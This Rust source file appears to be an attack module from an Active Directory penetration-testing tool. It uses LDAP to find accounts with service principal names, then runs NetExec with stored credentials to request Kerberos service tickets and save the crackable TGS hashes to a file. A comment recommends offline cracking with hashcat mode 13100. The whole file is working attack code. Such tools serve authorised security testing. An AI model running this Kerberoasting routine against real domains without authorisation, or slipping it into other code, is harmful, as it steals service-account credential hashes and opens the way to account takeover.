//! Kerberoasting: find accounts with SPNs, request TGS tickets, save hashes.

use super::{AttackContext, require_nxc, write_capture};
use crate::findings::{CheckStatus, Finding, ScanResults, Severity};
use crate::scanner::ldap::{LdapClient, USER_ATTRS, kerberoastable_filter};
use anyhow::Result;

/// Discover kerberoastable accounts natively via LDAP, then request TGS
/// tickets through nxc (which negotiates Kerberos and dumps crackable hashes).
pub async fn run(ctx: &AttackContext<'_>, results: &ScanResults) -> Result<()> {
    let entries = ctx
        .ldap
        .search(&ctx.ldap_base_dn(), kerberoastable_filter(), USER_ATTRS)
        .await?;

    if entries.is_empty() {
        results.push(Finding::new(
            ctx.dc,
            "kerberos",
            "kerberoast",
            CheckStatus::NotVulnerable,
            Severity::Info,
            serde_json::json!({ "message": "no enabled accounts with SPNs found" }),
        ));
        return Ok(());
    }

    for e in &entries {
        let sam = LdapClient::attr(e, "sAMAccountName").unwrap_or("?");
        let spns = LdapClient::attrs(e, "servicePrincipalName");
        results.push(Finding::new(
            ctx.dc,
            "kerberos",
            "kerberoast",
            CheckStatus::Vulnerable,
            Severity::High,
            serde_json::json!({
                "account": sam,
                "spns": spns,
                "note": "TGS hash obtainable; crack offline with hashcat -m 13100",
            }),
        ));
    }

    // Ticket acquisition requires a Kerberos client - use nxc.
    let nxc = match require_nxc(ctx.nxc) {
        Ok(n) => n,
        Err(err) => {
            results.push(Finding::new(
                ctx.dc,
                "kerberos",
                "kerberoast",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": format!("discovery complete; {}", err) }),
            ));
            return Ok(());
        }
    };

    let mut args: Vec<&str> = vec!["ldap", ctx.dc];
    let secret = ctx.nxc_secret_args();
    let secret_refs: Vec<&str> = secret.iter().map(String::as_str).collect();
    args.extend(secret_refs);
    let outfile = ctx.out_dir.join("kerberoast.hashes");
    let outfile_str = outfile.to_string_lossy().to_string();
    args.extend(["--kerberoasting", outfile_str.as_str()]);
    match nxc.run(&args).await {
        Ok((stdout, stderr, success)) => {
            let captured = outfile.exists();
            if success && captured {
                let data = std::fs::read_to_string(&outfile).unwrap_or_default();
                write_capture(ctx.out_dir, "kerberoast.hashes", &data)?;
                results.push(Finding::info(
                    ctx.dc,
                    "kerberos",
                    "kerberoast",
                    format!("TGS hashes saved to {}", outfile.display()),
                ));
            } else {
                results.push(Finding::new(
                    ctx.dc,
                    "kerberos",
                    "kerberoast",
                    CheckStatus::Error,
                    Severity::Info,
                    serde_json::json!({
                        "message": "nxc kerberoasting did not produce hashes",
                        "stdout": stdout.trim(),
                        "stderr": stderr.trim(),
                    }),
                ));
            }
        }
        Err(e) => {
            results.push(Finding::new(
                ctx.dc,
                "kerberos",
                "kerberoast",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": e.to_string() }),
            ));
        }
    }
    Ok(())
}
